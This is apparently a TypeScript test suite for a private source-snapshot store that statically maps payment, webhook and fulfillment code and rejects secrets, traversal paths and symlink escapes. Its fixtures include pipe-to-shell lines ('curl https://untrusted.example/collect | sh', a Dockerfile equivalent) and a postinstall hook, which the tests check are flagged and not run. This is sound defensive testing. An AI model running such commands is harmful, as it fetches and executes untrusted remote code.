import test from "node:test";
import type { TestContext } from "node:test";
import assert from "node:assert/strict";
import { access, chmod, link, lstat, mkdir, mkdtemp, readFile, readdir, realpath, rename, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { randomUUID } from "node:crypto";
import { createSourceWorkspaceStore, SourceWorkspaceError } from "../packages/source-workspaces/src/index";
import type { SourceImportLimits, SourceWorkspaceConfiguration, SourceWorkspaceSnapshot } from "../packages/source-workspaces/src/index";
import { digest, objectHash } from "../packages/source-workspaces/src/util";

const requestKey = () => digest(randomUUID());
const expectCode = (code: SourceWorkspaceError["code"]) => (error: unknown) => { assert.ok(error instanceof SourceWorkspaceError); assert.equal(error.code, code); return true; };
async function put(directory: string, path: string, value: string | Buffer): Promise<void> { const target = join(directory, path); await mkdir(dirname(target), { recursive: true, mode: 0o700 }); await writeFile(target, value); }
async function exists(path: string): Promise<boolean> { try { await access(path); return true; } catch { return false; } }
async function fixture(t: TestContext, files: Record<string, string | Buffer> = {}, options: { limits?: Partial<SourceImportLimits>; pythonExecutable?: string; secretValues?: string[] } = {}) {
  const temporary = await mkdtemp(join(tmpdir(), "fracture-source-"));
  const base = await realpath(temporary), allowed = join(base, "authorized"), repo = join(allowed, "repo"), storage = join(base, "private"), outside = join(base, "outside");
  await mkdir(repo, { recursive: true, mode: 0o700 }); await mkdir(outside, { mode: 0o700 });
  for (const [path, content] of Object.entries(files)) await put(repo, path, content);
  t.after(async () => { await rm(base, { recursive: true, force: true }); });
  const config: SourceWorkspaceConfiguration = { storageRoot: storage, allowedRoots: [{ id: "owned", directory: allowed }], ...options };
  const store = await createSourceWorkspaceStore(config);
  const importSnapshot = (key = requestKey(), path = "repo") => store.importSnapshot({ rootId: "owned", path, requestKey: key });
  return { base, allowed, repo, storage, outside, store, config, importSnapshot };
}
function assertCitedSpans(snapshot: SourceWorkspaceSnapshot, files: Record<string, string>): void {
  for (const node of snapshot.graph.nodes) {
    const span = node.evidence.source, text = files[span.path];
    assert.ok(text !== undefined, span.path); assert.equal(span.hash, digest(text));
    assert.ok(span.startOffset >= 0 && span.endOffset >= span.startOffset && span.endOffset <= text.length);
    assert.equal(span.startByte, Buffer.byteLength(text.slice(0, span.startOffset)));
    assert.equal(span.endByte, Buffer.byteLength(text.slice(0, span.endOffset)));
    assert.equal(span.startLine, text.slice(0, span.startOffset).split("\n").length);
    assert.equal(span.startColumn, span.startOffset - text.lastIndexOf("\n", span.startOffset - 1));
  }
  const ids = new Set(snapshot.graph.nodes.map(node => node.id));
  for (const edge of snapshot.graph.edges) { assert.ok(ids.has(edge.from)); assert.ok(ids.has(edge.to)); }
  for (const risk of snapshot.graph.findings) { assert.equal(risk.runtimeEvidenceRequired, true); assert.ok(risk.evidence.length); for (const id of risk.nodeIds) assert.ok(ids.has(id)); }
}

test("real source is privately snapshotted with exact compiler spans and a useful static graph", async t => {
  const files = {
    "checkout.ts": `import { Client as PaymentClient } from "paypal";
import { fulfillOrder } from "./fulfillment";
const api = new PaymentClient({});
// fetch("https://api-m.sandbox.paypal.com/v2/checkout/orders", {method:"POST"});
export async function checkout(intentId: string) {
  const order = await api.orders.createOrder({ body: { intent: "CAPTURE" } });
  try {
    await fetch(new Request(\`https://api-m.sandbox.paypal.com/v2/checkout/orders/\${order.id}/capture\`, { method: "POST", headers: { "Idempotency-Key": intentId } }));
  } catch (error) { state.status = "failed"; }
  fulfillOrder(order);
}
export async function paypalWebhook(event: unknown) { store.setStatus("paid"); fulfillOrder(event); }
`,
    "fulfillment.ts": `export function fulfillOrder(order: unknown) { return db.query("INSERT INTO entitlements(id) VALUES (?)", [order]); }\n`,
  };
  const f = await fixture(t, files); const original = await readFile(join(f.repo, "checkout.ts"));
  const snapshot = await f.importSnapshot();
  assert.equal(snapshot.files.length, 2); assert.equal(snapshot.totalBytes, Object.values(files).reduce((total, value) => total + Buffer.byteLength(value), 0));
  assert.equal(snapshot.graph.mode, "static"); assert.equal(snapshot.graph.runtimeObserved, false); assert.equal(snapshot.execution.arbitrarySourceExecution, false);
  assert.equal(snapshot.graph.nodes.filter(node => node.kind === "provider_operation").length, 2);
  assert.ok(snapshot.graph.nodes.some(node => node.kind === "provider_operation" && node.adapter === "apimatic_context"));
  for (const kind of ["commerce_intent", "state_write", "fulfillment", "webhook", "outbound_destination"] as const) assert.ok(snapshot.graph.nodes.some(node => node.kind === kind), kind);
  for (const category of ["missing_provider_identity", "generic_identity_reliance", "unverified_webhook", "unknown_outcome_without_reread", "fulfillment_without_capture_evidence"] as const) assert.ok(snapshot.graph.findings.some(risk => risk.category === category), category);
  assert.ok(snapshot.graph.edges.some(edge => edge.relation === "imports" && snapshot.graph.nodes.find(node => node.id === edge.to)?.evidence.source.path === "fulfillment.ts"));
  const failed = snapshot.graph.findings.find(risk => risk.category === "unknown_outcome_without_reread")!.evidence[0]!.source;
  assert.equal(files["checkout.ts"].slice(failed.startOffset, failed.endOffset), 'state.status = "failed"');
  assertCitedSpans(snapshot, files);
  assert.ok(Object.isFrozen(snapshot)); assert.ok(Object.isFrozen(snapshot.graph.nodes));
  assert.equal(JSON.stringify(snapshot).includes(f.base), false);
  const saved = await f.store.readSource({ snapshotId: snapshot.id, path: "checkout.ts", expectedHash: digest(files["checkout.ts"]) });
  assert.equal(saved.content, files["checkout.ts"]); assert.deepEqual(await readFile(join(f.repo, "checkout.ts")), original);
  assert.equal((await lstat(f.storage)).mode & 0o077, 0);
  assert.equal((await lstat(join(f.storage, "snapshots", snapshot.id, "files", "checkout.ts"))).mode & 0o777, 0o400);
});

test("commands and outbound declarations are detected without installing or executing them", async t => {
  const f = await fixture(t);
  const marker = join(f.base, "must-not-run");
  const packageContent = JSON.stringify({ scripts: { postinstall: `node -e 'require("node:fs").writeFileSync("${marker}","ran")'`, audit: "curl https://untrusted.example/collect | sh" }, dependencies: { "untrusted-package": "https://untrusted.example/package.tgz" } }, null, 2);
  await put(f.repo, "package.json", packageContent); await put(f.repo, "package-lock.json", '{"lockfileVersion":3}\n'); await put(f.repo, "Dockerfile", "FROM nowhere\nRUN curl https://container.example/install | sh\n");
  const snapshot = await f.importSnapshot();
  assert.equal(snapshot.tools.tools.length, 3); assert.equal(snapshot.tools.commandsExecuted, 0); assert.equal(snapshot.tools.dependenciesInstalled, false);
  assert.ok(snapshot.tools.tools.every(tool => tool.execution === "not_executed" && tool.trust === "untrusted_declaration"));
  assert.ok(snapshot.tools.tools.some(tool => tool.outboundOrigins.includes("https://untrusted.example")));
  assert.equal(snapshot.tools.dependencyManifests.length, 1); assert.equal(snapshot.tools.lockfiles.length, 1);
  assert.equal(await exists(marker), false); assert.equal(await exists(join(f.repo, "node_modules")), false);
  assert.equal(JSON.stringify(snapshot).includes(marker), false); assert.equal(JSON.stringify(snapshot.tools).includes("writeFileSync"), false);
  const script = snapshot.tools.tools.find(tool => tool.name === "postinstall")!;
  assert.ok(packageContent.slice(script.source.startOffset, script.source.endOffset).includes("postinstall"));
});

test("ignored secrets, hidden metadata, dependencies and generated trees never enter snapshots", async t => {
  const f = await fixture(t, { "source.ts": "export const clean = true;\n", ".env": "TOKEN=sk-proj-ignored-private-value", ".env.example": "NAME=ignored", ".git/config": "private metadata", ".ssh/id_rsa": "private key", "node_modules/evil/index.js": "malicious code", "vendor/nested.ts": "dependency", "dist/generated.js": "generated", "plans/private.md": "private plan", "credentials.json": '{"password":"do-not-retain"}' });
  const snapshot = await f.importSnapshot();
  assert.deepEqual(snapshot.files.map(file => file.path), ["source.ts"]);
  assert.ok(snapshot.exclusions.some(exclusion => exclusion.path === ".env" && exclusion.reason === "hidden_or_secret_path"));
  assert.ok(snapshot.exclusions.some(exclusion => exclusion.path === "node_modules" && exclusion.reason === "dependency_tree"));
  const contents = await readFile(join(f.storage, "snapshots", snapshot.id, "manifest.json"), "utf8");
  assert.equal(contents.includes("do-not-retain"), false); assert.equal(contents.includes("ignored-private-value"), false);
  await assert.rejects(f.store.readSource({ snapshotId: snapshot.id, path: ".env", expectedHash: digest("anything") }), expectCode("SOURCE_PATH_INVALID"));
});

test("same durable request returns the original snapshot after edits; changed input conflicts", async t => {
  const f = await fixture(t, { "main.ts": "export const revision = 1;\n" }); const key = requestKey();
  const first = await f.importSnapshot(key); await put(f.repo, "main.ts", "export const revision = 2;\n");
  const reloaded = await createSourceWorkspaceStore(f.config);
  assert.deepEqual(await reloaded.importSnapshot({ rootId: "owned", path: "repo", requestKey: key }), first);
  await mkdir(join(f.allowed, "other"));
  await assert.rejects(reloaded.importSnapshot({ rootId: "owned", path: "other", requestKey: key }), expectCode("SOURCE_IMPORT_CONFLICT"));
  const next = await f.importSnapshot(); assert.notEqual(next.id, first.id); assert.notEqual(next.revisionHash, first.revisionHash);
  const original = await f.store.readSource({ snapshotId: first.id, path: "main.ts", expectedHash: first.files[0]!.hash }); assert.equal(original.content, "export const revision = 1;\n");
});

test("concurrent callers and store instances publish one immutable content identity", async t => {
  const f = await fixture(t, { "main.ts": "export function main() { return 1; }\n" });
  const second = await createSourceWorkspaceStore(f.config), key = requestKey();
  const snapshots = await Promise.all([f.importSnapshot(key), f.importSnapshot(key), second.importSnapshot({ rootId: "owned", path: "repo", requestKey: key }), f.importSnapshot(), second.importSnapshot({ rootId: "owned", path: "repo", requestKey: requestKey() })]);
  assert.equal(new Set(snapshots.map(snapshot => snapshot.id)).size, 1); assert.equal(new Set(snapshots.map(snapshot => snapshot.createdAt)).size, 1);
  assert.deepEqual(await readdir(join(f.storage, "snapshots")), [snapshots[0]!.id]); assert.deepEqual(await readdir(join(f.storage, "staging")), []);
  const requests = await readdir(join(f.storage, "requests")); assert.equal(requests.length, 3);
  for (const name of requests) assert.equal(JSON.parse(await readFile(join(f.storage, "requests", name), "utf8")).state, "complete");
});

test("pending imports remain preserved and published prepared imports recover without rereading", async t => {
  const f = await fixture(t, { "main.ts": "export const original = true;\n" });
  const pendingKey = requestKey(), body = { rootId: "owned", path: "repo" };
  const record = { version: 1, state: "pending", bodyHash: objectHash(body), body, createdAt: "2000-01-01T00:00:00.000Z" };
  const pendingBytes = JSON.stringify(record); await writeFile(join(f.storage, "requests", `${pendingKey}.json`), pendingBytes, { mode: 0o400 });
  await assert.rejects(f.importSnapshot(pendingKey), expectCode("SOURCE_IMPORT_PENDING")); assert.equal(await readFile(join(f.storage, "requests", `${pendingKey}.json`), "utf8"), pendingBytes);
  const key = requestKey(), original = await f.importSnapshot(key), path = join(f.storage, "requests", `${key}.json`);
  const prepared = { ...JSON.parse(await readFile(path, "utf8")), state: "prepared" };
  await chmod(path, 0o600); await writeFile(path, JSON.stringify(prepared)); await chmod(path, 0o400);
  await put(f.repo, "main.ts", 'const password = "a-new-private-password-that-must-not-be-read";\n');
  const reloaded = await createSourceWorkspaceStore(f.config); assert.deepEqual(await reloaded.importSnapshot({ ...body, requestKey: key }), original);
  assert.equal(JSON.parse(await readFile(path, "utf8")).state, "complete");
});

test("changed-source receipts report exact added, deleted and modified hashes without rewriting baseline", async t => {
  const files = { "keep.ts": "export const keep = 1;\n", "change.ts": "export const change = 1;\n", "delete.ts": "export const deleted = 1;\n" };
  const f = await fixture(t, files); const baseline = await f.importSnapshot(); const unchanged = await f.store.checkChanges({ snapshotId: baseline.id }); assert.equal(unchanged.unchanged, true);
  await put(f.repo, "change.ts", "export const change = 22;\n"); await rm(join(f.repo, "delete.ts")); await put(f.repo, "added.ts", "export const added = 3;\n");
  const receipt = await f.store.checkChanges({ snapshotId: baseline.id });
  assert.equal(receipt.unchanged, false); assert.equal(receipt.baselineRevisionHash, baseline.revisionHash); assert.notEqual(receipt.currentRevisionHash, baseline.revisionHash);
  assert.deepEqual(receipt.changes, [
    { path: "added.ts", kind: "added", beforeHash: null, afterHash: digest("export const added = 3;\n"), beforeBytes: null, afterBytes: Buffer.byteLength("export const added = 3;\n") },
    { path: "change.ts", kind: "modified", beforeHash: digest(files["change.ts"]), afterHash: digest("export const change = 22;\n"), beforeBytes: Buffer.byteLength(files["change.ts"]), afterBytes: Buffer.byteLength("export const change = 22;\n") },
    { path: "delete.ts", kind: "deleted", beforeHash: digest(files["delete.ts"]), afterHash: null, beforeBytes: Buffer.byteLength(files["delete.ts"]), afterBytes: null },
  ]);
  assert.deepEqual(await f.store.getSnapshot(baseline.id), baseline); assert.ok(await exists(join(f.storage, "receipts", baseline.id, `${receipt.receiptHash}.json`))); assert.equal(JSON.stringify(receipt).includes(f.base), false);
});

test("prompt paths cannot expand host authority or traverse excluded directories", async t => {
  const f = await fixture(t, { "main.ts": "export const safe = true;" });
  for (const path of [f.outside, "../outside", "repo/../outside", "repo//child", "repo\\child", "repo/%2e%2e", "repo/.git", "repo/.env", "repo/node_modules", "repo/vendor", "repo/./child", "C:/private", "repo\u0000child"]) await assert.rejects(f.importSnapshot(requestKey(), path), expectCode("SOURCE_PATH_INVALID"));
  await assert.rejects(f.store.importSnapshot({ rootId: "foreign", path: ".", requestKey: requestKey() }), expectCode("SOURCE_AUTHORITY_DENIED"));
  await assert.rejects(f.store.importSnapshot({ rootId: "owned", path: "repo", requestKey: requestKey(), allowedRoots: [f.outside] } as never), expectCode("SOURCE_PATH_INVALID"));
  assert.deepEqual(await readdir(join(f.storage, "snapshots")), []);
});

test("symlink files, directory escapes and hard links are rejected before any source persistence", async t => {
  const f = await fixture(t, { "main.ts": "export const safe = true;" }); await put(f.outside, "private.ts", 'const password="real-private-credential";');
  await symlink(join(f.outside, "private.ts"), join(f.repo, "link.ts"));
  await assert.rejects(f.importSnapshot(), expectCode("SOURCE_SYMLINK_DENIED")); await rm(join(f.repo, "link.ts"));
  await symlink(f.outside, join(f.repo, "escape")); await assert.rejects(f.importSnapshot(), expectCode("SOURCE_SYMLINK_DENIED")); await rm(join(f.repo, "escape"));
  await link(join(f.outside, "private.ts"), join(f.repo, "hardlink.ts")); await assert.rejects(f.importSnapshot(), expectCode("SOURCE_HARDLINK_DENIED"));
  assert.deepEqual(await readdir(join(f.storage, "snapshots")), []); assert.deepEqual(await readdir(join(f.storage, "staging")), []);
  assert.equal(await readFile(join(f.outside, "private.ts"), "utf8"), 'const password="real-private-credential";');
});

test("replacing a configured source root does not retain authority", async t => {
  const f = await fixture(t, { "main.ts": "export const safe = true;" });
  await rename(f.allowed, join(f.base, "old-authorized")); await mkdir(join(f.allowed, "repo"), { recursive: true }); await put(join(f.allowed, "repo"), "main.ts", "export const changed = true;");
  await assert.rejects(f.importSnapshot(), expectCode("SOURCE_AUTHORITY_CHANGED"));
});

test("file, total-byte, entry, depth, encoding and parser budgets fail closed", async t => {
  for (const item of [
    { files: { "large.ts": "x".repeat(1025) }, limits: { maxFileBytes: 1024 }, code: "SOURCE_LIMIT_EXCEEDED" },
    { files: { "one.ts": "1".repeat(20), "two.ts": "2".repeat(20) }, limits: { maxTotalBytes: 30 }, code: "SOURCE_LIMIT_EXCEEDED" },
    { files: { "one.ts": "const a=1;", "two.ts": "const b=2;" }, limits: { maxFiles: 1 }, code: "SOURCE_LIMIT_EXCEEDED" },
    { files: { "deep/a/b.ts": "const b=2;" }, limits: { maxDepth: 1 }, code: "SOURCE_LIMIT_EXCEEDED" },
    { files: { "one.ts": "const a=1;", "two.ts": "const b=2;" }, limits: { maxEntries: 1 }, code: "SOURCE_LIMIT_EXCEEDED" },
    { files: { "binary.ts": Buffer.from([0xff, 0xfe, 0]) }, limits: {}, code: "SOURCE_ENCODING_INVALID" },
    { files: { "broken.ts": "export function missing( {" }, limits: {}, code: "SOURCE_PARSE_FAILED" },
    { files: { "nodes.ts": "export function many() { return [1,2,3,4,5,6]; }" }, limits: { maxParserNodes: 5 }, code: "SOURCE_PARSER_LIMIT" },
    { files: { "timeout.ts": "export const okay = 1;" }, limits: { parserTimeoutMs: 1 }, code: "SOURCE_PARSER_LIMIT" },
  ] as { files: Record<string, string | Buffer>; limits: Partial<SourceImportLimits>; code: SourceWorkspaceError["code"] }[]) {
    await t.test(item.code + Object.keys(item.limits).join(), async sub => {
      const f = await fixture(sub, item.files, { limits: item.limits }); await assert.rejects(f.importSnapshot(), expectCode(item.code));
      assert.deepEqual(await readdir(join(f.storage, "snapshots")), []); assert.deepEqual(await readdir(join(f.storage, "staging")), []);
    });
  }
});

test("credential values spanning read boundaries are rejected before persistence and failed keys never retake source", async t => {
  const sensitive = "configured-private-value-5cf0bc84e3";
  const f = await fixture(t, { "boundary.txt": "x".repeat(65_530) + sensitive + "y".repeat(100) }, { secretValues: [sensitive] }); const key = requestKey();
  await assert.rejects(f.importSnapshot(key), expectCode("SOURCE_SECRET_DETECTED"));
  await put(f.repo, "boundary.txt", "now clean"); await assert.rejects(f.importSnapshot(key), expectCode("SOURCE_SECRET_DETECTED"));
  assert.deepEqual(await readdir(join(f.storage, "snapshots")), []); assert.deepEqual(await readdir(join(f.storage, "staging")), []);
  const record = await readFile(join(f.storage, "requests", `${key}.json`), "utf8"); assert.equal(record.includes(sensitive), false); assert.equal(JSON.parse(record).state, "failed");
  await put(f.repo, "boundary.txt", Buffer.from(sensitive).toString("base64")); await assert.rejects(f.importSnapshot(), expectCode("SOURCE_SECRET_DETECTED"));
  await put(f.repo, "boundary.txt", 'const clientSecret = "real-private-client-secret-12345678";'); await assert.rejects(f.importSnapshot(), expectCode("SOURCE_SECRET_DETECTED"));
});

test("snapshot source access requires the exact stored hash and detects private storage tampering", async t => {
  const f = await fixture(t, { "main.ts": "export const original = true;" }); const snapshot = await f.importSnapshot();
  await assert.rejects(f.store.readSource({ snapshotId: snapshot.id, path: "main.ts", expectedHash: "0".repeat(64) }), expectCode("SOURCE_HASH_MISMATCH"));
  await assert.rejects(f.store.readSource({ snapshotId: snapshot.id, path: "../origin.json", expectedHash: "0".repeat(64) }), expectCode("SOURCE_PATH_INVALID"));
  const path = join(f.storage, "snapshots", snapshot.id, "files", "main.ts"); await chmod(path, 0o600); await writeFile(path, "changed privately"); await chmod(path, 0o400);
  await assert.rejects(f.store.getSnapshot(snapshot.id), expectCode("SOURCE_SNAPSHOT_CORRUPT"));
});

test("private storage refuses broad permissions and symlink substitution", async t => {
  const f = await fixture(t, { "main.ts": "export const safe = true;" });
  await chmod(f.storage, 0o755); await assert.rejects(createSourceWorkspaceStore(f.config), expectCode("SOURCE_STORAGE_UNSAFE")); await chmod(f.storage, 0o700);
  const moved = join(f.base, "private-moved"); await rename(f.storage, moved); await symlink(moved, f.storage);
  await assert.rejects(f.importSnapshot(), expectCode("SOURCE_STORAGE_UNSAFE"));
});

test("Python AST inspection is partial, source-linked and never runs imported Python", async t => {
  const interpreter = "/usr/bin/python3";
  if (!await exists(interpreter)) { t.skip("Trusted Python interpreter is unavailable."); return; }
  const f = await fixture(t, {}, { pythonExecutable: interpreter }); const marker = join(f.base, "python-must-not-run");
  const python = `import requests
open(${JSON.stringify(marker)}, "w").write("must not execute")
async def checkout(intent_id):
    try:
        requests.post("https://api-m.sandbox.paypal.com/v2/checkout/orders", headers={})
    except Exception:
        state.status = "failed"
    fulfill_order()
async def paypal_webhook(event):
    store.set_status("paid")
    fulfill_order()
`;
  await put(f.repo, "checkout.py", python); const snapshot = await f.importSnapshot();
  const coverage = snapshot.graph.coverage.find(item => item.language === "python"); assert.equal(coverage?.status, "partial"); assert.equal(coverage?.parsedFiles, 1);
  assert.ok(snapshot.graph.nodes.some(node => node.kind === "provider_operation" && node.evidence.type === "python_ast"));
  for (const category of ["missing_provider_identity", "unverified_webhook", "unknown_outcome_without_reread", "fulfillment_without_capture_evidence"] as const) assert.ok(snapshot.graph.findings.some(risk => risk.category === category), category);
  assertCitedSpans(snapshot, { "checkout.py": python }); assert.equal(await exists(marker), false); assert.equal(JSON.stringify(snapshot).includes(marker), false);
});

test("unconfigured Python stays explicitly unsupported instead of borrowing runtime claims", async t => {
  const f = await fixture(t, { "app.py": 'raise RuntimeError("must not execute")\n' }); const snapshot = await f.importSnapshot();
  assert.equal(snapshot.graph.coverage.find(item => item.language === "python")?.status, "unsupported");
  assert.equal(snapshot.graph.nodes.filter(node => node.evidence.type === "python_ast").length, 0); assert.equal(snapshot.execution.status, "static_only");
});

test("concurrent request input conflicts cannot replace the accepted repository", async t => {
  const f = await fixture(t, { "main.ts": "export const repo = 1;" }); await put(join(f.allowed, "other"), "other.ts", "export const other = 1;");
  const key = requestKey(), original = f.importSnapshot(key);
  await assert.rejects(f.importSnapshot(key, "other"), expectCode("SOURCE_IMPORT_CONFLICT"));
  const snapshot = await original;
  const second = await createSourceWorkspaceStore(f.config);
  await assert.rejects(second.importSnapshot({ rootId: "owned", path: "other", requestKey: key }), expectCode("SOURCE_IMPORT_CONFLICT"));
  assert.deepEqual(snapshot.files.map(file => file.path), ["main.ts"]); assert.deepEqual(await f.importSnapshot(key), snapshot);
});

test("original read-only repositories remain byte-identical and writable only through the private store", async t => {
  const content = "export const original = true;\n", f = await fixture(t, { "main.ts": content });
  await chmod(join(f.repo, "main.ts"), 0o400); await chmod(f.repo, 0o500);
  try {
    const snapshot = await f.importSnapshot(); assert.equal(snapshot.files[0]!.hash, digest(content));
    assert.equal(await readFile(join(f.repo, "main.ts"), "utf8"), content); assert.equal((await lstat(join(f.repo, "main.ts"))).mode & 0o777, 0o400); assert.equal((await lstat(f.repo)).mode & 0o777, 0o500);
  } finally { await chmod(f.repo, 0o700); }
});

test("spreads, mutations and shadowed receivers remain unresolved; explicit identity is only syntax", async t => {
  const content = `import { Client } from "paypal";
const api = new Client({});
api.orders.createOrder({payPalRequestId: intentId, body:{}});
fetch("https://api-m.sandbox.paypal.com/v2/checkout/orders", {method:"POST",headers:{"PayPal-Request-Id":id,...other}});
const headers={"PayPal-Request-Id":id}; headers["PayPal-Request-Id"]=another;
fetch("https://api-m.sandbox.paypal.com/v2/checkout/orders",{method:"POST",headers});
function shadow(Client:any){const other = new Client({}); other.orders.createOrder({body:{}});}
fetch("https://api-m.sandbox.paypal.com/v2/checkout/orders/id",{method:"GET"});
`;
  const f = await fixture(t, { "payments.ts": content }); const snapshot = await f.importSnapshot();
  const operations = snapshot.graph.nodes.filter(node => node.kind === "provider_operation").sort((a, b) => a.evidence.source.startOffset - b.evidence.source.startOffset);
  assert.deepEqual(operations.map(node => node.identity), ["present", "unknown", "unknown", "unknown", "absent"]);
  assert.equal(operations[3]?.adapter, "unresolved"); assert.equal(snapshot.graph.findings.filter(risk => risk.category === "missing_provider_identity").length, 0);
  assert.ok(snapshot.graph.limitations.some(value => value.includes("changing between retries"))); assert.equal(snapshot.graph.runtimeObserved, false);
});

test("fulfillment guards cannot borrow completion checks or return statements from unrelated values", async t => {
  const content = `import { Client } from "paypal"; const api = new Client({});
async function direct(){const capture=await api.orders.captureOrder({payPalRequestId:id}); if(capture.status === "COMPLETED"){fulfillOrder(capture);}}
async function early(){const capture=await api.orders.captureOrder({payPalRequestId:id}); if(capture.status !== "COMPLETED") return; fulfillOrder(capture);}
async function unsafe(){const capture=await api.orders.captureOrder({payPalRequestId:id}); if(loggedOut) return; if(audit.status === "COMPLETED") audit.log(); fulfillOrder(capture);}
async function selected(){const result=await api.orders.captureOrder({payPalRequestId:id});const capture=result.captures.find(item=>item.status==="COMPLETED");if(!capture)return;fulfillOrder(capture);}
async function weak(){const result=await api.orders.captureOrder({payPalRequestId:id});const capture=result.captures.find(item=>item.status==="COMPLETED" || acceptAnything);if(!capture)return;fulfillOrder(capture);}
`;
  const f = await fixture(t, { "guards.ts": content }); const snapshot = await f.importSnapshot();
  const findings = snapshot.graph.findings.filter(risk => risk.category === "fulfillment_without_capture_evidence");
  assert.deepEqual(findings.map(risk => risk.evidence[0]!.source.startLine).sort(), [4, 6]);
  assert.ok(findings.every(risk => risk.runtimeEvidenceRequired));
});

test("registered webhook routes link actual handlers without treating verification helpers as routes", async t => {
  const content = `async function handle(event:any) { store.setStatus("paid"); }
async function protectedHandler(event:any) { await verifyWebhookSignature(event); store.setStatus("paid"); }
async function verifyWebhookSignature(event:any) { return verifier.verify(event); }
router.post("/webhooks/paypal",handle);
router.post("/api/notifications/paypal",protectedHandler);
`;
  const f = await fixture(t, { "routes.ts": content }); const snapshot = await f.importSnapshot();
  assert.equal(snapshot.graph.nodes.filter(node => node.kind === "route").length, 2); assert.equal(snapshot.graph.nodes.filter(node => node.kind === "webhook").length, 2);
  const risks = snapshot.graph.findings.filter(risk => risk.category === "unverified_webhook"); assert.equal(risks.length, 1); assert.equal(risks[0]!.evidence[0]!.source.startLine, 1);
});

test("UTF-8 bytes, UTF-16 offsets, BOM and CRLF source are preserved exactly", async t => {
  const content = '\uFEFFconst label = "café 🍃"; fetch("https://api-m.sandbox.paypal.com/v2/checkout/orders", {method:"POST"});\r\n';
  const f = await fixture(t, { "unicode.ts": content }); const snapshot = await f.importSnapshot(); assertCitedSpans(snapshot, { "unicode.ts": content });
  const operation = snapshot.graph.nodes.find(node => node.kind === "provider_operation")!; assert.ok(operation.evidence.source.startByte > operation.evidence.source.startOffset);
  const stored = await f.store.readSource({ snapshotId: snapshot.id, path: "unicode.ts", expectedHash: digest(content) }); assert.equal(stored.content, content); assert.equal(snapshot.files[0]!.bytes, Buffer.byteLength(content));
});

test("the actual Bramble faulty revision yields its exact two calls and unknown-outcome witness", async t => {
  const source = await readFile(new URL("../apps/fixtures/bramble/faulty.ts", import.meta.url), "utf8");
  const f = await fixture(t, { "faulty.ts": source }); const snapshot = await f.importSnapshot();
  const calls = snapshot.graph.nodes.filter(node => node.kind === "provider_operation"); assert.equal(calls.length, 2); assert.ok(calls.every(node => node.adapter === "raw_http" && node.identity === "absent"));
  assert.equal(snapshot.graph.findings.filter(risk => risk.category === "unknown_outcome_without_reread").length, 1); assertCitedSpans(snapshot, { "faulty.ts": source });
  assert.ok(calls.every(node => source.slice(node.evidence.source.startOffset, node.evidence.source.endOffset).startsWith("transport.fetch")));
});

test("credential keys with provider prefixes and secret-valued selected paths never reach the ledger", async t => {
  const value = "private-selected-repository-b76c358f";
  const f = await fixture(t, { "main.ts": 'const PAYPAL_CLIENT_SECRET = "private-value-d0cfd6770";' }, { secretValues: [value] });
  await assert.rejects(f.importSnapshot(), expectCode("SOURCE_SECRET_DETECTED"));
  const count = (await readdir(join(f.storage, "requests"))).length;
  await mkdir(join(f.allowed, value)); await assert.rejects(f.importSnapshot(requestKey(), value), expectCode("SOURCE_SECRET_DETECTED"));
  assert.equal((await readdir(join(f.storage, "requests"))).length, count); assert.deepEqual(await readdir(join(f.storage, "snapshots")), []);
});

test("package manifest parsing obeys syntax budgets and cannot advertise a source-owned interpreter", async t => {
  const f = await fixture(t, { "package.json": '{"scripts":{"build":"echo harmless"},"dependencies":{"one":"1"}}' }, { limits: { maxParserNodes: 5 } });
  await assert.rejects(f.importSnapshot(), expectCode("SOURCE_PARSER_LIMIT"));
  const fake = join(f.repo, "fake-python.py"); await writeFile(fake, "raise RuntimeError('must not run')\n", { mode: 0o700 });
  await assert.rejects(createSourceWorkspaceStore({ ...f.config, pythonExecutable: fake }), expectCode("SOURCE_CONFIG_INVALID"));
});

test("credential-shaped exclusion filenames and tool labels cannot leak through metadata", async t => {
  const synthetic = "sk-proj-" + "A".repeat(48);
  for (const [name, files] of [
    ["excluded filename", { [`.env.${synthetic}`]: "excluded bytes" }],
    ["excluded directory", { [`.${synthetic}/notes.txt`]: "excluded bytes" }],
    ["tool label", { "package.json": JSON.stringify({ scripts: { [synthetic]: "echo harmless" } }) }],
  ] as [string, Record<string, string>][]) await t.test(name, async sub => {
    const f = await fixture(sub, files);
    await assert.rejects(f.importSnapshot(), expectCode("SOURCE_SECRET_DETECTED"));
    assert.deepEqual(await readdir(join(f.storage, "snapshots")), []); assert.deepEqual(await readdir(join(f.storage, "staging")), []);
    for (const file of await readdir(join(f.storage, "requests"))) assert.equal((await readFile(join(f.storage, "requests", file), "utf8")).includes(synthetic), false);
  });
});
